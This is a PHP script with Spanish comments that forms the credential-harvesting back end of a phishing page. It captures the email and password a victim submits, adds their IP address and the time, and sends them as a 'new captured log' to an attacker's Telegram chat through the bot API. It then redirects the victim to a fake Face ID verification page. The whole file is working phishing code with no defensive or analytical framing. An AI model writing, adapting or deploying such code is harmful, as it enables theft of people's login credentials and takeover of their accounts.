<?php
// processlogin.php
// Procesa el login, envía el log a Telegram y redirige a la verificación de identidad.

// *** INICIAR SESIÓN ***
session_start();

// 1. Cargar la configuración
$config = require 'conexion.php';

// Comprobar si la configuración de Telegram está disponible
if (!isset($config['telegram']['bot_token']) || !isset($config['telegram']['chat_id'])) {
    http_response_code(500);
    die("Error: Credenciales de Telegram no configuradas correctamente.");
}

$botToken = $config['telegram']['bot_token'];
$chatId = $config['telegram']['chat_id'];

// 2. Recibir los datos
$user = $_POST['email'] ?? 'No especificado';
$log = $_POST['password'] ?? 'No especificado';
$ipAddress = $_SERVER['REMOTE_ADDR'] ?? 'Desconocida';
$time = date('Y-m-d H:i:s');

// *** GUARDAR EL CORREO EN LA SESIÓN ***
$_SESSION['logged_in_email'] = $user;

// 3. Formatear el mensaje
$message = "🚨 ¡NUEVO LOG CAPTURADO! 🚨\n\n";
$message .= "📧 *Usuario (Email):* " . htmlspecialchars($user) . "\n";
$message .= "🔒 *Contraseña (Log):* " . htmlspecialchars($log) . "\n";
$message .= "🌐 *IP:* " . htmlspecialchars($ipAddress) . "\n";
$message .= "⏰ *Fecha/Hora:* " . $time . "\n";

$encodedMessage = urlencode($message);

// 4. Construir la URL de la API de Telegram
$telegramApiUrl = "https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatId}&text={$encodedMessage}&parse_mode=Markdown";

// 5. Enviar la solicitud a Telegram
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

// 6. Redirección FINAL a la página de verificación de Face ID
// NOTA: Asumo que segurity_faceid.php está en el mismo nivel que este script
header('Location: ../../segurity_faceid.php'); 
exit;